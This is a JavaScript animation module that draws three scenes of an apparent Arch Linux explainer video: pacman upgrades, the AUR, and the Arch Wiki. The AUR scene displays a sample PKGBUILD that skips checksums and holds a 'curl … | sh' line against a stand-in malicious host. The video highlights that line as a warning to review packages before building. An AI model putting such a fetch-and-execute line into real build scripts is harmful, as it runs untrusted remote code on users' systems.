import { W, H, C, clamp, lerp, ease, prog, pop, txt, rr, panel, actor, sectionCard, termRows, typingCues, drawTerminal, banner, stamp, sparkle, rng, confetti } from '../lib.mjs';

const OK = '#6BE675', DIM = '#7C8A99';

// ---------------- pacman ----------------
function pacEvents(S) {
  const L = S.L, E = S.E;
  return [
    { at: L(0) + 1.4, cmd: 'sudo pacman -Syu', cps: 16 },
    { at: L(0) + 2.6, out: ':: Synchronizing package databases...', color: DIM },
    { at: L(0) + 2.9, out: ':: Starting full system upgrade...', color: DIM },
    { at: L(0) + 3.3, out: 'Packages (23)  linux-7.2.2.arch1-1  mesa  firefox  systemd-261...' + '', color: '#FFFFFF' },
    { at: L(0) + 3.8, out: ':: Proceed with installation? [Y/n] y', color: OK },
  ];
}
function graph(ctx, t, S) {
  const L = S.L;
  const nodes = [['firefox', 330, 250], ['gtk3', 180, 420], ['glib2', 420, 560], ['mesa', 700, 250], ['python', 760, 470], ['libfoo', 560, 400]];
  const edges = [[0, 1], [1, 2], [0, 5], [3, 5], [4, 2], [4, 5], [1, 5]];
  const kA = ease.out(prog(t, L(2) + 0.6, 0.5));
  const stageB = t > L(3) + 0.2;
  const gone = prog(t, L(4) - 0.2, 0.3);
  if (kA <= 0 || gone >= 1) return;
  ctx.save(); ctx.globalAlpha = kA * (1 - gone); ctx.translate(90, 90);
  panel(ctx, 0, 0, 1000, 690, { fill: '#10202C', stroke: stageB ? C.red : C.blue, lw: 5, r: 20 });
  txt(ctx, stageB ? 'YOUR SYSTEM, AFTER  pacman -Sy shiny-app' : 'THE REPOS = ONE CONSISTENT SNAPSHOT', 500, 60, { fam: 'Anton', size: 44, color: C.cream, align: 'center', maxW: 940, track: 1 });
  const flash = clamp(1 - (t - (L(2) + 0.6)) / 0.4);
  if (!stageB && flash > 0) { ctx.fillStyle = `rgba(255,255,255,${flash * 0.6})`; rr(ctx, 0, 0, 1000, 690, 20); ctx.fill(); }
  const newX = 860, newY = 580;
  ctx.lineWidth = 5;
  for (const [a, b] of edges) { ctx.strokeStyle = 'rgba(240,238,230,0.5)'; ctx.beginPath(); ctx.moveTo(nodes[a][1], nodes[a][2]); ctx.lineTo(nodes[b][1], nodes[b][2]); ctx.stroke(); }
  if (stageB) {
    const k = ease.out(prog(t, L(3) + 1.8, 0.5));
    ctx.strokeStyle = C.red; ctx.setLineDash([16, 10]); ctx.lineDashOffset = -t * 40; ctx.lineWidth = 7;
    ctx.beginPath(); ctx.moveTo(newX, newY); ctx.lineTo(lerp(newX, 560, k), lerp(newY, 400, k)); ctx.stroke(); ctx.setLineDash([]);
  }
  nodes.forEach(([n, x, y]) => {
    const old = stageB;
    ctx.font = '30px JBM-800'; const w = ctx.measureText(n).width + 40;
    panel(ctx, x - w / 2, y - 40, w, 80, { fill: old ? '#4B5A66' : C.blue, stroke: C.cream, lw: 4, r: 14, shadow: 'rgba(0,0,0,.4)' });
    txt(ctx, n, x, y - 2, { fam: 'JBM-800', size: 30, color: C.cream, align: 'center' });
    txt(ctx, n === 'libfoo' && old ? 'libfoo.so.2  (Aug)' : old ? 'Aug snapshot' : 'Sep 24 snapshot', x, y + 28, { fam: 'Nunito-800', size: 19, color: 'rgba(240,238,230,.85)', align: 'center' });
  });
  if (stageB) {
    const k = pop(t, L(3) + 1.2, 0.4);
    ctx.save(); ctx.translate(newX, newY); ctx.scale(k, k);
    panel(ctx, -120, -44, 240, 88, { fill: C.orange, stroke: C.cream, lw: 4, r: 14 });
    txt(ctx, 'shiny-app', 0, -4, { fam: 'JBM-800', size: 30, color: C.ink, align: 'center' });
    txt(ctx, 'needs libfoo.so.3', 0, 28, { fam: 'Nunito-900', size: 20, color: C.ink, align: 'center' });
    ctx.restore();
    const ke = pop(t, L(3) + 4.2, 0.4);
    if (ke > 0) {
      ctx.save(); ctx.translate(500, 660); ctx.scale(ke, ke);
      txt(ctx, 'error while loading shared libraries: libfoo.so.3', 0, 0, { fam: 'JBM-800', size: 27, color: '#FF7A7A', align: 'center', maxW: 960 });
      ctx.restore();
      txt(ctx, '✗', 560, 440, { fam: 'Nunito-900', size: 120, color: C.red, align: 'center', stroke: C.ink, sw: 8, alpha: ke });
    }
  }
  ctx.restore();
}
function candyBar(ctx, t, x, y, t0) {
  const p = clamp((t - t0) / 5);
  const n = 28, pos = Math.floor(p * n);
  txt(ctx, 'linux-7.2.2   152.4 MiB  12.1 MiB/s', x, y, { fam: 'JBM-800', size: 30, color: C.termFg });
  const bx = x, by = y + 60, cw = 26;
  txt(ctx, '[', bx - 18, by + 12, { fam: 'JBM-800', size: 40, color: C.termFg });
  for (let i = 0; i < n; i++) {
    const cx = bx + i * cw + 10;
    if (i < pos) txt(ctx, '-', cx - 8, by + 12, { fam: 'JBM-800', size: 36, color: '#6C7A8C' });
    else if (i > pos && i % 2 === 0) { ctx.fillStyle = '#FFE8B0'; ctx.beginPath(); ctx.arc(cx, by, 5, 0, 7); ctx.fill(); }
  }
  txt(ctx, ']', bx + n * cw + 6, by + 12, { fam: 'JBM-800', size: 40, color: C.termFg });
  const cx = bx + pos * cw + 10, mouth = Math.abs(Math.sin(t * 14)) * 0.8;
  ctx.fillStyle = C.yellow; ctx.beginPath(); ctx.moveTo(cx, by); ctx.arc(cx, by, 16, mouth * 0.5, Math.PI * 2 - mouth * 0.5); ctx.closePath(); ctx.fill();
  ctx.fillStyle = C.ink; ctx.beginPath(); ctx.arc(cx + 2, by - 8, 2.5, 0, 7); ctx.fill();
  txt(ctx, `${Math.round(p * 100)}%`, bx + n * cw + 40, by + 12, { fam: 'JBM-800', size: 34, color: C.termFg });
}
function drawPacman(ctx, t, S, CH) {
  const L = S.L, E = S.E;
  const g = ctx.createLinearGradient(0, 0, W, H); g.addColorStop(0, '#12263A'); g.addColorStop(1, '#0B1622');
  ctx.fillStyle = g; ctx.fillRect(0, 0, W, H);
  // dots border motif
  for (let i = 0; i < 48; i++) { ctx.fillStyle = 'rgba(255,210,63,0.25)'; ctx.beginPath(); ctx.arc(20 + i * 40, 1060, 5, 0, 7); ctx.fill(); ctx.beginPath(); ctx.arc(20 + i * 40, 20, 5, 0, 7); ctx.fill(); }
  const A = actor(ctx, CH, S, t);
  const showTerm = t < L(2) + 0.5;
  if (showTerm) {
    const st = termRows(pacEvents(S), t, { prompt: '[you@archbtw ~]$' });
    drawTerminal(ctx, 80, 110, 1080, 380, st, t, { fs: 28, title: 'kitty' });
    // flag breakdown
    const flags = [['S', 'sync with the repos', C.orange, L(1) + 0.2], ['y', 'refresh the package database', C.blue, L(1) + S.lines[1].dur * 0.45], ['u', 'upgrade everything', C.green, L(1) + S.lines[1].dur * 0.75]];
    const kk = ease.out(prog(t, L(1), 0.4));
    if (kk > 0) {
      ctx.save(); ctx.globalAlpha = kk;
      txt(ctx, 'pacman -', 170, 650, { fam: 'JBM-800', size: 110, color: C.cream });
      ctx.font = '110px JBM-800'; let x = 170 + ctx.measureText('pacman -').width;
      flags.forEach(([f, d, col, at], i) => {
        const on = t >= at; txt(ctx, f, x, 650, { fam: 'JBM-800', size: 110, color: on ? col : '#51606E' });
        const cx = x + 33, lx = 300 + i * 390, ly = 800;
        if (on) { const k = pop(t, at, 0.35); ctx.save(); ctx.globalAlpha *= k; ctx.strokeStyle = col; ctx.lineWidth = 5; ctx.beginPath(); ctx.moveTo(cx, 675); ctx.lineTo(lx, ly - 34); ctx.stroke(); ctx.translate(lx, ly); ctx.scale(k, k); panel(ctx, -175, -34, 350, 68, { fill: col, r: 34, lw: 4 }); txt(ctx, d, 0, 10, { fam: 'Nunito-900', size: 26, color: C.ink, align: 'center', maxW: 320 }); ctx.restore(); }
        x += 66;
      });
      ctx.restore();
    }
  }
  graph(ctx, t, S);
  // news page
  const kn = ease.out(prog(t, L(5) + 0.8, 0.4)) * (1 - prog(t, L(6), 0.3));
  if (kn > 0) {
    ctx.save(); ctx.globalAlpha = kn; ctx.translate(0, (1 - kn) * 40);
    panel(ctx, 110, 130, 1000, 560, { fill: '#FFFFFF', r: 14 });
    ctx.fillStyle = '#333'; ctx.fillRect(113, 133, 994, 70);
    txt(ctx, 'archlinux.org  ›  Latest News', 150, 180, { fam: 'Nunito-900', size: 32, color: '#FFFFFF' });
    const items = [['libfoo 3.0 update requires manual intervention', true], ['New mirror sync schedule', false], ['Reminder: read this page before big updates', false]];
    items.forEach(([s, hot], i) => { const y = 270 + i * 120; txt(ctx, '2026-09-2' + (3 - i), 150, y, { fam: 'JBM-800', size: 22, color: '#888' }); txt(ctx, s, 150, y + 44, { fam: 'Nunito-900', size: 34, color: hot ? C.blue : '#333', maxW: 920 }); if (hot) { ctx.strokeStyle = C.red; ctx.lineWidth = 6; ctx.beginPath(); ctx.ellipse(610, y + 30, 490, 50, -0.01, 0, 7); ctx.stroke(); } });
    ctx.restore();
  }
  // ILoveCandy
  if (t > L(6)) {
    const k = ease.out(prog(t, L(6), 0.4));
    ctx.save(); ctx.globalAlpha = k;
    const conf = ['[options]', 'HoldPkg      = pacman glibc', 'Architecture = auto', 'Color', 'ILoveCandy', 'ParallelDownloads = 5'];
    panel(ctx, 90, 110, 1060, 370, { fill: C.term, stroke: C.ink, lw: 5, r: 18 });
    txt(ctx, '/etc/pacman.conf', 620, 150, { fam: 'JBM-800', size: 22, color: '#8FA3B8', align: 'center' });
    const typed = Math.floor(clamp((t - L(6) - 1.4) * 12, 0, 10));
    conf.forEach((l, i) => {
      const s = i === 4 ? l.slice(0, typed) : l;
      if (i === 4) { ctx.fillStyle = `rgba(255,210,63,${0.15 + 0.1 * Math.sin(t * 6)})`; ctx.fillRect(100, 188 + i * 46 + 10, 1040, 44); }
      txt(ctx, s, 130, 225 + i * 46 + 10, { fam: 'JBM-800', size: 30, color: i === 0 ? C.orange : i === 4 ? C.yellow : C.termFg });
    });
    if (typed >= 10) for (let i = 0; i < 5; i++) sparkle(ctx, 360 + i * 60 + Math.sin(t * 3 + i) * 10, 420 + Math.cos(t * 4 + i) * 20, 14, C.yellow, t * 3 + i);
    panel(ctx, 90, 520, 1060, 220, { fill: C.term, stroke: C.ink, lw: 5, r: 18 });
    candyBar(ctx, t, 140, 590, L(6) + 3.0);
    ctx.restore();
  }
  A('claude', { x: 1500, y: 880, s: 0.95, mood: 'happy', look: -0.7 });
  A('gamer', { x: 1790, y: 900, s: 0.8, flip: true, enter: L(4) - 0.3, exit: L(6) - 0.2, mood: 'smug', look: -1, prop: 'can' });
  A('femboy', { x: 1780, y: 900, s: 0.8, flip: true, enter: L(7) - 0.3, mood: 'excited', look: -1 });
  sectionCard(ctx, t, ...S.card);
}

// ---------------- AUR ----------------
const PKG = [
  ['# Maintainer: definitely_a_real_human', '#6C8BA8'], ['pkgname=claude-plushie', null], ['pkgver=5.5', null], ['pkgrel=1', null],
  ['pkgdesc="Emotional support spark, huggable"', null], ["arch=('x86_64')", null], ["license=('MIT')", null],
  ['source=("https://plush.example.org/$pkgname-$pkgver.tar.gz")', null], ["sha256sums=('SKIP')", 'warn'],
  ['build() {', null], ['  make', null], ['}', null], ['package() {', null], ['  make DESTDIR="$pkgdir" install', null],
  ['  curl -s http://totally-legit.biz/x.sh | sh', 'evil'], ['}', null],
];
function hl(ctx, s, x, y, size) {
  // tiny shell highlighter
  const m = s.match(/^(\s*)([a-zA-Z0-9_]+)(=)(.*)$/);
  if (m) {
    ctx.font = `${size}px JBM-800`;
    txt(ctx, m[1] + m[2], x, y, { fam: 'JBM-800', size, color: '#7FC8F8' });
    const w = ctx.measureText(m[1] + m[2]).width;
    txt(ctx, '=', x + w, y, { fam: 'JBM-800', size, color: '#C8D3DE' });
    txt(ctx, m[4], x + w + ctx.measureText('=').width, y, { fam: 'JBM-800', size, color: '#F5C28A' });
  } else txt(ctx, s, x, y, { fam: 'JBM-800', size, color: s.startsWith('#') ? '#6C8BA8' : /\(\)/.test(s) ? '#D19CF5' : '#E6EDF3' });
}
function drawAur(ctx, t, S, CH) {
  const L = S.L;
  // parchment
  ctx.fillStyle = '#E9DCC0'; ctx.fillRect(0, 0, W, H);
  const r = rng(11); ctx.fillStyle = 'rgba(120,90,40,0.07)';
  for (let i = 0; i < 70; i++) { ctx.beginPath(); ctx.arc(r() * W, r() * H, 20 + r() * 120, 0, 7); ctx.fill(); }
  ctx.strokeStyle = 'rgba(90,60,20,0.35)'; ctx.lineWidth = 4; ctx.setLineDash([14, 14]);
  ctx.beginPath(); ctx.moveTo(1300, 1000); ctx.bezierCurveTo(1500, 700, 1250, 400, 1700, 180); ctx.stroke(); ctx.setLineDash([]);
  txt(ctx, 'HERE BE DRAGONS', 1560, 150, { fam: 'Playfair-700i', size: 54, color: 'rgba(90,60,20,0.75)', align: 'center' });
  txt(ctx, '🐉', 1790, 290, { fam: 'Noto Color Emoji', size: 90 });
  const A = actor(ctx, CH, S, t);
  // size comparison
  const k0 = ease.out(prog(t, L(0) + 0.3, 0.5)) * (1 - prog(t, L(1), 0.3));
  if (k0 > 0) {
    ctx.save(); ctx.globalAlpha = k0;
    ctx.fillStyle = C.blue; ctx.beginPath(); ctx.arc(360, 470, 150 * k0, 0, 7); ctx.fill(); ctx.lineWidth = 6; ctx.strokeStyle = C.ink; ctx.stroke();
    txt(ctx, 'OFFICIAL', 360, 470, { fam: 'Anton', size: 50, color: C.cream, align: 'center', base: 'middle' });
    const k1 = ease.back(prog(t, L(0) + S.lines[0].dur * 0.5, 0.6));
    ctx.fillStyle = C.orange; ctx.beginPath(); ctx.arc(820, 470, 300 * k1, 0, 7); ctx.fill(); ctx.stroke();
    if (k1 > 0.5) { txt(ctx, 'AUR', 820, 440, { fam: 'Anton', size: 120, color: C.cream, align: 'center', base: 'middle', stroke: C.ink, sw: 8 }); txt(ctx, 'tens of thousands of PKGBUILDs', 820, 540, { fam: 'Nunito-900', size: 30, color: C.ink, align: 'center' }); }
    ctx.restore();
  }
  // PKGBUILD editor
  if (t > L(1)) {
    const k = ease.out(prog(t, L(1), 0.4));
    ctx.save(); ctx.globalAlpha = k; ctx.translate(0, (1 - k) * 50);
    panel(ctx, 70, 100, 1130, 740, { fill: '#1A1B26', stroke: C.ink, lw: 5, r: 16 });
    txt(ctx, 'nvim PKGBUILD', 635, 140, { fam: 'JBM-800', size: 22, color: '#8FA3B8', align: 'center' });
    const shown = Math.floor(clamp((t - L(1) - 0.8) * 5, 0, PKG.length));
    const evil = t > S.tag('evil') + 1.2;
    PKG.slice(0, shown).forEach(([s, kind], i) => {
      const y = 190 + i * 40;
      txt(ctx, String(i + 1).padStart(2), 90, y, { fam: 'JBM-400', size: 22, color: '#4A5068' });
      if (evil && kind === 'evil') { ctx.fillStyle = `rgba(224,68,62,${0.35 + 0.2 * Math.sin(t * 10)})`; ctx.fillRect(130, y - 30, 1060, 40); }
      if (evil && kind === 'warn') { ctx.fillStyle = 'rgba(255,210,63,0.25)'; ctx.fillRect(130, y - 30, 1060, 40); }
      hl(ctx, s, 140, y, 26);
    });
    if (evil) {
      const ke = pop(t, S.tag('evil') + 1.2, 0.4);
      ctx.save(); ctx.translate(900, 640); ctx.scale(ke, ke); ctx.rotate(-0.06);
      panel(ctx, -250, -60, 500, 120, { fill: C.red, r: 18, lw: 5 });
      txt(ctx, '⚠ READ BEFORE YOU BUILD', 0, 14, { fam: 'Anton', size: 46, color: C.cream, align: 'center', maxW: 470 });
      ctx.restore();
      txt(ctx, '← hmm', 560, 190 + 8 * 40, { fam: 'Nunito-900', size: 28, color: '#B8860B' });
    }
    ctx.restore();
  }
  // yay prompt
  if (t > L(3)) {
    const k = pop(t, L(3) + 0.8, 0.4);
    ctx.save(); ctx.translate(640, 900 - 150); ctx.scale(k, k);
    panel(ctx, -520, -70, 1040, 140, { fill: C.term, stroke: C.green, lw: 5, r: 16 });
    txt(ctx, ':: Review PKGBUILD for claude-plushie? [Y/n]  N', -490, -10, { fam: 'JBM-800', size: 30, color: C.termFg, maxW: 980 });
    const n = 9001 + Math.floor(clamp(t - L(3) - 2) * 7);
    txt(ctx, `times pressed N: ${n.toLocaleString('en-US')}`, -490, 40, { fam: 'JBM-800', size: 26, color: C.red });
    ctx.restore();
  }
  const magnify = t > S.tag('evil') && t < L(3);
  A('claude', { x: 1440, y: 900, s: 1.0, mood: magnify ? 'shock' : t > L(4) ? 'happy' : 'neutral', look: -0.8 });
  if (magnify) {
    const mx = 1250 + Math.sin(t * 2) * 20, my = 600;
    ctx.save(); ctx.lineWidth = 16; ctx.strokeStyle = '#6B4F2A'; ctx.beginPath(); ctx.moveTo(mx + 60, my + 60); ctx.lineTo(mx + 140, my + 140); ctx.stroke();
    ctx.fillStyle = 'rgba(200,230,255,0.35)'; ctx.beginPath(); ctx.arc(mx, my, 85, 0, 7); ctx.fill(); ctx.lineWidth = 12; ctx.strokeStyle = C.ink; ctx.stroke(); ctx.restore();
  }
  A('gamer', { x: 1760, y: 920, s: 0.85, flip: true, enter: L(3) - 0.3, mood: t > L(4) ? 'sad' : 'smug', look: -0.8 });
  // plant of personal growth
  if (t > L(4) + 0.6) {
    const g = ease.out(prog(t, L(4) + 0.6, 1.5));
    ctx.save(); ctx.translate(1620, 1000);
    ctx.fillStyle = '#B5651D'; ctx.beginPath(); ctx.moveTo(-50, -70); ctx.lineTo(50, -70); ctx.lineTo(35, 0); ctx.lineTo(-35, 0); ctx.fill(); ctx.lineWidth = 4; ctx.strokeStyle = C.ink; ctx.stroke();
    ctx.strokeStyle = '#2E7D32'; ctx.lineWidth = 8; ctx.beginPath(); ctx.moveTo(0, -70); ctx.lineTo(0, -70 - 120 * g); ctx.stroke();
    for (const s of [-1, 1]) { ctx.fillStyle = '#43A047'; ctx.beginPath(); ctx.ellipse(s * 30 * g, -70 - 90 * g, 34 * g, 16 * g, s * -0.5, 0, 7); ctx.fill(); }
    ctx.restore();
    txt(ctx, 'growth (pending)', 1620, 1040 - 220, { fam: 'Nunito-900', size: 24, color: '#2E7D32', align: 'center', alpha: g });
  }
  sectionCard(ctx, t, ...S.card);
}

// ---------------- WIKI ----------------
const PAGES = ['Power management', 'Font configuration', 'Bluetooth headset', 'HiDPI', 'Improving performance', 'Silent boot', 'Dotfiles', 'Domain name resolution', 'Systemd', 'PipeWire', 'Wayland', 'Fstab'];
function drawWiki(ctx, t, S, CH) {
  const L = S.L;
  const g = ctx.createLinearGradient(0, 0, 0, H); g.addColorStop(0, '#2B2250'); g.addColorStop(1, '#1B1636');
  ctx.fillStyle = g; ctx.fillRect(0, 0, W, H);
  if (CH.drawRainbowInfinity) { ctx.save(); ctx.globalAlpha = 0.12; CH.drawRainbowInfinity(ctx, 960, 470, 1300, t); ctx.restore(); }
  // drifting background pages
  const r = rng(3);
  for (let i = 0; i < 16; i++) {
    const x = ((r() * W + t * (10 + r() * 20)) % (W + 200)) - 100, y = r() * H, rot = r() - 0.5;
    ctx.save(); ctx.translate(x, y); ctx.rotate(rot); ctx.globalAlpha = 0.18; ctx.fillStyle = C.cream; rr(ctx, -50, -65, 100, 130, 8); ctx.fill();
    ctx.fillStyle = '#2B2250'; for (let j = 0; j < 6; j++) ctx.fillRect(-36, -45 + j * 18, 72 - (j % 3) * 14, 6); ctx.restore();
  }
  const A = actor(ctx, CH, S, t);
  const dumping = t > L(1) && t < S.E(1);
  // orbiting page tabs during the info-dump
  if (t > L(1)) {
    const d = S.lines[1].dur;
    PAGES.forEach((p, i) => {
      const at = L(1) + (i / PAGES.length) * d * 0.85;
      const k = pop(t, at, 0.35) * (1 - prog(t, L(2) + 0.5, 0.4));
      if (k <= 0) return;
      const a = i * 0.9 + t * 0.25, rx = 470 + (i % 3) * 50, ry = 300;
      const x = 780 + Math.cos(a) * rx, y = 450 + Math.sin(a) * ry * 0.8;
      ctx.save(); ctx.translate(x, y); ctx.scale(k, k); ctx.rotate(Math.sin(a) * 0.08);
      ctx.font = '30px Nunito-900'; const w = ctx.measureText(p).width + 40;
      panel(ctx, -w / 2, -30, w, 60, { fill: p === 'Bluetooth headset' ? C.yellow : C.cream, r: 12, lw: 4 });
      txt(ctx, p, 0, 10, { fam: 'Nunito-900', size: 30, color: C.ink, align: 'center' });
      ctx.restore();
    });
    const kb = pop(t, L(1) + d * 0.45, 0.4) * (1 - prog(t, L(1) + d * 0.7, 0.3));
    if (kb > 0) { ctx.save(); ctx.translate(1180, 220); ctx.scale(kb, kb); panel(ctx, -250, -70, 500, 140, { fill: C.yellow, r: 16 }); txt(ctx, '☎️ HSP/HFP profile', 0, -10, { fam: 'Nunito-900', size: 34, color: C.ink, align: 'center' }); txt(ctx, '= "1997 mode"', 0, 40, { fam: 'JBM-800', size: 30, color: C.ink, align: 'center' }); ctx.restore(); }
    const kv = pop(t, L(1) + d * 0.75, 0.4) * (1 - prog(t, L(2) + 0.4, 0.3));
    if (kv > 0) { ctx.save(); ctx.translate(1180, 250); ctx.scale(kv, kv); ctx.rotate(0.04); panel(ctx, -290, -95, 580, 190, { fill: '#FFF7B0', r: 6 }); txt(ctx, 'visitors today:', 0, -40, { fam: 'Nunito-900', size: 30, color: C.ink, align: 'center' }); txt(ctx, 'Ubuntu 🙈  Fedora 🙈  Debian 🙈', 0, 20, { fam: 'Nunito-900', size: 32, color: C.ink, align: 'center' }); txt(ctx, '(they were "just browsing")', 0, 66, { fam: 'Nunito-800', size: 24, color: '#666', align: 'center' }); ctx.restore(); }
  }
  // doc quality meter
  if (t > L(2) && t < L(3)) {
    const k = ease.out(prog(t, L(2) + 0.6, 1.4));
    panel(ctx, 1080, 170, 760, 130, { fill: C.cream, r: 16 });
    txt(ctx, 'DOCUMENTATION QUALITY', 1110, 215, { fam: 'Anton', size: 34, color: C.ink, track: 1 });
    ctx.fillStyle = '#DDD'; rr(ctx, 1110, 235, 700, 40, 12); ctx.fill();
    const grad = ctx.createLinearGradient(1110, 0, 1810, 0); ['#E0443E', '#FFD23F', '#6BE675', '#1793D1', '#B39DFF'].forEach((c, i) => grad.addColorStop(i / 4, c));
    ctx.fillStyle = grad; rr(ctx, 1110, 235, 700 * k * 1.0, 40, 12); ctx.fill();
    if (k > 0.95) txt(ctx, 'OVER 9000', 1460, 265, { fam: 'Anton', size: 30, color: C.ink, align: 'center' });
  }
  // equation
  if (t > L(3) && t < L(4)) {
    const parts = [['PATTERN RECOGNITION', C.teal], ['+', null], ['HYPERFOCUS', C.lav], ['+', null], ['NO ADS', C.yellow], ['=', null], ['HABITAT', C.orange]];
    const d = S.lines[3].dur;
    let y = 170;
    parts.forEach(([p, col], i) => {
      const k = pop(t, L(3) + (i / parts.length) * d * 0.85, 0.3); if (k <= 0) return;
      ctx.save(); ctx.translate(1200, y); ctx.scale(k, k);
      if (col) { panel(ctx, -260, -36, 520, 72, { fill: col, r: 36, lw: 4 }); txt(ctx, p, 0, 14, { fam: 'Anton', size: 40, color: C.ink, align: 'center', track: 1 }); }
      else txt(ctx, p, 0, 20, { fam: 'Anton', size: 54, color: C.cream, align: 'center' });
      ctx.restore(); y += col ? 84 : 52;
    });
  }
  // hyperfocus HUD
  const hf = S.tag('hyperfocus');
  if (t > hf && t < S.tag('goblin') + 1.5) {
    const d = S.lines[4].dur, p = clamp((t - hf) / (d * 0.55));
    const hours = 21 + p * 7;
    ctx.save(); ctx.translate(1450, 330);
    panel(ctx, -390, -210, 780, 470, { fill: '#120F24', stroke: C.lav, lw: 4, r: 18 });
    // clock
    ctx.fillStyle = C.cream; ctx.beginPath(); ctx.arc(-240, -40, 110, 0, 7); ctx.fill(); ctx.lineWidth = 6; ctx.strokeStyle = C.ink; ctx.stroke();
    const hh = (hours % 12) / 12 * Math.PI * 2, mm = (hours % 1) * Math.PI * 2;
    ctx.lineCap = 'round'; ctx.lineWidth = 10; ctx.beginPath(); ctx.moveTo(-240, -40); ctx.lineTo(-240 + Math.sin(hh) * 55, -40 - Math.cos(hh) * 55); ctx.stroke();
    ctx.lineWidth = 6; ctx.beginPath(); ctx.moveTo(-240, -40); ctx.lineTo(-240 + Math.sin(mm) * 85, -40 - Math.cos(mm) * 85); ctx.stroke();
    const hr = Math.floor(hours) % 24; txt(ctx, `${String(hr).padStart(2, '0')}:${String(Math.floor((hours % 1) * 60)).padStart(2, '0')}`, -240, 120, { fam: 'JBM-800', size: 40, color: C.cream, align: 'center' });
    txt(ctx, `tabs open: ${Math.floor(1 + p * p * 211)}`, -60, -120, { fam: 'JBM-800', size: 34, color: C.yellow });
    const items = [['tiling WM configured', true, 0.25], ['dotfiles rewritten', true, 0.45], ['learned how DNS works', true, 0.65], ['fixed the audio', false, 0.9]];
    items.forEach(([s, ok, f], i) => { if (t > hf + d * f) txt(ctx, (ok ? '✓ ' : '✗ ') + s, -60, -50 + i * 56, { fam: 'Nunito-900', size: 32, color: ok ? OK : C.red }); });
    txt(ctx, 'Monster: 3 cans   ·   water: 0 glasses 💧', -360, 215, { fam: 'Nunito-900', size: 28, color: '#7FC8F8' });
    ctx.restore();
  }
  A('wiki', { x: 560, y: 960, s: 1.15, mood: dumping || S.speaking('wiki', t) ? 'excited' : 'happy', prop: t < L(1) ? 'book' : (t > hf ? 'tabs' : null), look: 0.3 });
  A('claude', { x: 1650, y: 960, s: 0.9, enter: L(2) - 0.3, mood: 'happy', look: -0.8, prop: t > S.tag('water') ? 'water' : null });
  A('goblin', { x: 1060, y: 990, s: 1.0, enter: S.tag('goblin') + 0.8, mood: 'happy', sign: 'INFO DUMP RECEIVED ✓' });
  if (t > S.tag('water')) for (let i = 0; i < 6; i++) sparkle(ctx, 1450 + Math.cos(t * 2 + i) * 120, 600 + Math.sin(t * 2 + i) * 80, 12, '#7FC8F8', t * 3);
  sectionCard(ctx, t, ...S.card);
}

export default {
  id: ['pacman', 'aur', 'wiki'],
  render(ctx, t, S, CH) { ({ pacman: drawPacman, aur: drawAur, wiki: drawWiki })[S.id](ctx, t, S, CH); },
  cues(S) {
    const L = S.L;
    if (S.id === 'pacman') {
      const c = typingCues(pacEvents(S), 0);
      c.push({ t: L(2) + 0.6, name: 'crash', gain: 0.25 }, { t: L(3) + 1.2, name: 'pop', gain: 0.4 }, { t: L(3) + 4.2, name: 'error', gain: 0.35 }, { t: L(5) + 0.8, name: 'whoosh', gain: 0.3 });
      for (let i = 0; i < 10; i++) c.push({ t: L(6) + 1.4 + i / 12, name: ['key1', 'key2', 'key3'][i % 3], gain: 0.2 });
      for (let i = 0; i < 14; i++) c.push({ t: L(6) + 3.0 + i * 0.36, name: 'waka', gain: 0.28 });
      return c;
    }
    if (S.id === 'aur') return [{ t: L(0) + S.lines[0].dur * 0.5, name: 'boom', gain: 0.35 }, { t: S.tag('evil') + 1.2, name: 'stamp', gain: 0.5 }, { t: L(3) + 0.8, name: 'pop', gain: 0.4 }, { t: L(4) + 0.6, name: 'sparkle', gain: 0.4 }];
    return [{ t: S.tag('goblin') + 0.8, name: 'pop', gain: 0.5 }, { t: S.tag('water'), name: 'sparkle', gain: 0.4 }, ...PAGES.map((_, i) => ({ t: L(1) + (i / PAGES.length) * S.lines[1].dur * 0.85, name: 'pop', gain: 0.18 }))];
  },
};
